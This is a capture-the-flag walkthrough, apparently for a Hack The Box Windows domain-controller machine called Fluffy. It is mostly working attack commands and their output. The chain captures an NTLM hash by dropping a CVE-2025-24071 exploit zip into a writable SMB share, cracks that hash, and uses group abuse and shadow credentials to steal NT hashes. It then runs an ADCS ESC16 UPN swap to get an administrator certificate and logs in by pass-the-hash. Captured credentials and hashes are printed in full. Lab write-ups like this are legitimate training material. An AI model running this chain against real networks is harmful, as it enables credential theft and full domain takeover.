# Fluffy Walkthrough

Machine Information  
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

## Recon

### Initial Scanning

I use nmap to find which port open  
nmap -p- --min-rate 10000 10.129.9.146

PORT      STATE SERVICE  
53/tcp    open  domain  
139/tcp   open  netbios-ssn  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
5985/tcp  open  wsman  
49667/tcp open  unknown  
49689/tcp open  unknown  
49690/tcp open  unknown  
49699/tcp open  unknown  
49712/tcp open  unknown  

Now I use those ports above to find their services  
nmap -sCV -p 53,88,139,389,445,464,593,636,3268,3269,598 -vv 10.129.9.146

PORT     STATE    SERVICE        REASON          VERSION  
53/tcp   open     domain         syn-ack ttl 127 Simple DNS Plus  
88/tcp   open     kerberos-sec   syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-03 07:21:16Z)  
139/tcp  open     netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn  
389/tcp  open     ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2025-04-17T16:04:17  
| Not valid after:  2026-04-17T16:04:17  
| MD5:     2765 a68f 4883 dc6d 0969 5d0d 3666 c880  
| SHA-1:   72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681  
| SHA-256: 20ab 7b99 256b 4385 9fac 457a 1890 37bf 37e2 5f11 5a62 e97c e072 e586 e83e 9dca  
| -----BEGIN CERTIFICATE-----  

|_-----END CERTIFICATE-----  
|_ssl-date: 2026-02-03T07:22:36+00:00; +6h59m59s from scanner time.  
445/tcp  open     microsoft-ds?  syn-ack ttl 127  
464/tcp  open     kpasswd5?      syn-ack ttl 127  
593/tcp  open     ncacn_http     syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0  
598/tcp  filtered sco-websrvrmg3 no-response  
636/tcp  open     ssl/ldap       syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2025-04-17T16:04:17  
| Not valid after:  2026-04-17T16:04:17  
| MD5:     2765 a68f 4883 dc6d 0969 5d0d 3666 c880  
| SHA-1:   72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681  
| SHA-256: 20ab 7b99 256b 4385 9fac 457a 1890 37bf 37e2 5f11 5a62 e97c e072 e586 e83e 9dca  
| -----BEGIN CERTIFICATE-----  
|
|_-----END CERTIFICATE-----  
|_ssl-date: 2026-02-03T07:22:36+00:00; +6h59m59s from scanner time.  
3268/tcp open     ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-02-03T07:22:36+00:00; +6h59m59s from scanner time.  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2025-04-17T16:04:17  
| Not valid after:  2026-04-17T16:04:17  
| MD5:     2765 a68f 4883 dc6d 0969 5d0d 3666 c880  
| SHA-1:   72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681  
| SHA-256: 20ab 7b99 256b 4385 9fac 457a 1890 37bf 37e2 5f11 5a62 e97c e072 e586 e83e 9dca  
| -----BEGIN CERTIFICATE-----  
| 
|_-----END CERTIFICATE-----  
3269/tcp open     ssl/ldap       syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2025-04-17T16:04:17  
| Not valid after:  2026-04-17T16:04:17  
| MD5:     2765 a68f 4883 dc6d 0969 5d0d 3666 c880  
| SHA-1:   72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681  
| SHA-256: 20ab 7b99 256b 4385 9fac 457a 1890 37bf 37e2 5f11 5a62 e97c e072 e586 e83e 9dca  
| -----BEGIN CERTIFICATE-----  
| 
|_-----END CERTIFICATE-----  
|_ssl-date: 2026-02-03T07:22:36+00:00; +6h59m59s from scanner time.  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:window  


The box shows many of port associate with Window Domain Controller. The domain is fluffy.htb, and the hostname is DC01.

I use netexec to generate host files

netexec smb 10.129.9.146 --generate-hosts-file hosts  
SMB         10.129.9.146    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  

Then I add /etc/hosts

sudo cat hosts /etc/hosts | sudo sponge /etc/hosts

### Initial Credentials

It works:  
netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'  
SMB         10.129.9.146    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.146    445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!   

It work for LDAP:
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'  
LDAP        10.129.9.146    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never)  
LDAP        10.129.9.146    389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!   

It is not working with winrm:  
netexec winrm dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'  
WINRM       10.129.9.146    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.129.9.146    5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!  

Here is the thing I want to do SMB shares, Bloodhound, ADCS:

I run adcs using net exec:  

netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs  
LDAP        10.129.9.146    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never)  
LDAP        10.129.9.146    389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!   
ADCS        10.129.9.146    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'  
ADCS        10.129.9.146    389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb  
ADCS        10.129.9.146    389    DC01             Found CN: fluffy-DC01-CA  

So there is a cert authority, and run certipy-ad for vuln

certipy-ad find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout

=> There is nothing to exploit at this point and now remove -vulnerable

certipy-ad find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -stdout  
=> There is nothing interesting

### Bloodhound  
I use Bloodhound to collect data

bloodhound-ce-python -c all -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.129.9.146 --zip

INFO: Done in 00M 12S  
INFO: Compressing output into 20260202200332_bloodhound.zip  

I 'MATCH (n) DETACH DELETE n' clear neo4j previous data

I’ll start with j.fleischman and mark them owned:

And there is no interesting outbound

### SMB tcp 445

netexec smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares  
SMB         10.129.9.146    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.146    445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!   
SMB         10.129.9.146    445    DC01             [*] Enumerated shares  
SMB         10.129.9.146    445    DC01             Share           Permissions     Remark  
SMB         10.129.9.146    445    DC01             -----           -----------     ------  
SMB         10.129.9.146    445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.9.146    445    DC01             C$                              Default share  
SMB         10.129.9.146    445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.9.146    445    DC01             IT              READ,WRITE        
SMB         10.129.9.146    445    DC01             NETLOGON        READ            Logon server share   
SMB         10.129.9.146    445    DC01             SYSVOL          READ            Logon server share   

Beside standard smb on Window domain controller, there's shared names IT that j.fleischman has permission read / write access to

smbclient '//10.129.9.146/IT' -U 'j.fleischman%J0elTHEM4n1990!'  
Try "help" to get a list of possible commands.  
smb: \> 

Essentially, you are logging into the "IT" folder on the server at 10.129.9.146 as the user j.fleischman. Once connected, you will enter an interactive shell (similar to FTP) where you can list, upload, or download files.

Then I download pdf since it caught my attention

smb: \> get Upgrade_Notice.pdf

### Authetication as p.agilia

CVE-2025-24071

The Nist description of this CVE is very weak:

Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.

### Exploit time

I use cve POC

git clone https://github.com/0x6rss/CVE-2025-24071_PoC && cd CVE-2025-24071_PoC

I put responder -I tun0 -A  to capture NTLMv2-SSP hash

smb: \> put exploit.zip 

[SMB] NTLMv2-SSP Client   : 10.129.9.146
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:536be0521d941cf7:016F5A093DC7D596B726900136677435:01010000000000008006ECCFF4CCDB01E15A69BBCE6ABF620000000002000800530031003000530001001E00570049004E002D004100340041004900420033005900320043005900350004003400570049004E002D00410034004100490042003300590032004300590035002E0053003100300053002E004C004F00430041004C000300140053003100300053002E004C004F00430041004C000500140053003100300053002E004C004F00430041004C00070008008006ECCFF4CCDB01060004000200000008003000300000000000000001000000002000001C72B20BB2F2DE4DDD3DA96A5779DC865AB4503DCEB78553A7E28954BF288E250A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330037000000000000000000

Hashcat is able to crack the hash with rockyou.txt and recovers the password prometheusx-303

I check if this password works

netexec smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'  
SMB         10.129.9.146    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.146    445    DC01             [+] fluffy.htb\p.agila:prometheusx-303   

=> It works for SMB

netexec winrm dc01.fluffy.htb -u p.agila -p 'prometheusx-303'  

WINRM       10.129.9.146    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.  ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.129.9.146    5985   DC01             [-] fluffy.htb\p.agila:prometheusx-303  

=> still not working for winrm

### Shell as winrm_svc

Their being a member of Service Account Managers gives them GenericAll over the Service Accounts group. Clicking on that group and looking at its outbound control, it has GenericWrite over three accounts

And winrm_svc is a member of the Remote Management Users group

For easy way to see, I see this all at once by going to the Cypher tab in Bloodhound, clicking the folder icon to open the pre-built queries, and selecting “Shortest paths from Owned objects”

### Recover NTLM for winrm_svc
I start by adding the p.agila user to the Service Accounts group

bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila  
[+] p.agila added to service accounts  

Now it is shadow credential. So p.agalia have GenericWrite over winrm_svc. I can target Kerberoast to get SPN, hash and get user password

Without doing faketime -f +7h, I could get the hash

faketime -f +7h certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

I do the same for ca_svc
faketime -f +7h certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc  
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8  

### Winrm 

Let's log in using evil winrm

evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767

Then retrieve the user flag 

*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt  
80c3aa0ea57ffb6db93145b2667b7427  

### Shell as Admin

Members of the Service Accounts group have GenericWrite over the ca_svc user, who is a member of the Cert Publishers Group which is a member of the Denied RODC Password Replication Group.

The Denied RODC Password Replication Group is a group that prevents passwords of its members from being cached on Read-Only Domain Controllers (RODCs)

### ADCS

I use certipy-ad to find any vuln

certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout

So the requirements for ESC16 are satisfied by having an account with GenericWrite to modify the UPN, request a certificate and then remove the UPN again

certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read

The UPN (userPrincipalName) is “ca_svc@fluffy.htb”

I tried to update to administrator

certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update

[*] Updating user 'ca_svc':  
    userPrincipalName                   : administrator  
[*] Successfully updated 'ca_svc'  

Then account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read

Now it becomes administrator

sAMAccountName                      : ca_svc  
    servicePrincipalName                : ADCS/ca.fluffy.htb  
    userPrincipalName                   : administrator  

So now i request the certificate

certipy-ad req -u ca_svc@fluffy.htb  -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -ca fluffy-DC01-CA
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'  

So with ESC16 security extension in place, this would not trust the mismatched UPN. So without it, it return the cert with UPN administrator

Then I will clean up and set back UPN to original

certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update

[!] Use -debug to print a stacktrace  
[*] Updating user 'ca_svc':  
    userPrincipalName                   : ca_svc@fluffy.htb  
[*] Successfully updated 'ca_svc'  

Then i get the hash  
faketime -f +7h certipy-ad auth -dc-ip 10.129.9.146 -pfx administrator.pfx -u administrator -domain fluffy.htb  
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

Now I login administrator with evil-winrm:

evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
3b7558784b31e260528a1fd368d15f55  
